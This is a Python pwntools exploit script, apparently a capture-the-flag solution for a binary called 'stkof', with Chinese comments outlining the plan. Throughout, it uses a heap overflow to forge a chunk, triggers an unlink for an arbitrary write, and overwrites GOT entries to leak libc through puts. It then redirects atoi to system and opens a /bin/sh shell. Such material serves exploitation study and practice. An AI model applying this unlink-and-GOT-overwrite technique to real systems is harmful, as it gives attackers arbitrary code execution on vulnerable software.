# -*- coding: utf-8 -*-
from pwn import *

#context(log_level='debug')
'''
漏洞：堆溢出
利用：
1、unlink 套路
0               0x41
0               0x20        <-----heapPtr
fd              bk
0x20            .....
0x30(-0x10)     低位置0

2、got常用
puts, free, atoi
free -> puts@plt -> leak libc
atoi -> system
'''
p = process("./stkof")
elf = ELF("./stkof")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def alloc(size):
    p.sendline('1')
    p.sendline(str(size))
    p.recvuntil('OK\n')

def edit(idx, size, content):
    p.sendline('2')
    p.sendline(str(idx))
    p.sendline(str(size))
    p.send(content)
    p.recvuntil('OK\n')

def free(idx):
    p.sendline('3')
    p.sendline(str(idx))
    
gdb.attach(p)
alloc(0x100)
head = 0x602148

alloc(0x30)
alloc(0x80)
alloc(0x80)

payload = p64(0)+p64(0x20)+p64(head+0x8-0x18)+p64(head+0x8-0x10)+p64(0x20)+p64(0)+p64(0x30)+p64(0x90)
edit(2,len(payload),payload)
pause()
free(3)

payload = p64(0)*2 + p64(elf.got["puts"]) + p64(elf.got["atoi"]) + p64(elf.got["free"])
edit(2,len(payload),payload)

payload = p64(elf.plt["puts"])
edit(3,len(payload),payload)
free(1)
x = p.recv()
putaddr = u64(x[3:9]+"\x00\x00")
log.success(hex(putaddr))
libcbase = putaddr - libc.symbols["puts"]
log.success(hex(libcbase))
systemaddr = libcbase + libc.symbols["system"]
payload = p64(systemaddr)
edit(2,len(payload),payload)
p.sendline("/bin/sh")

p.interactive()
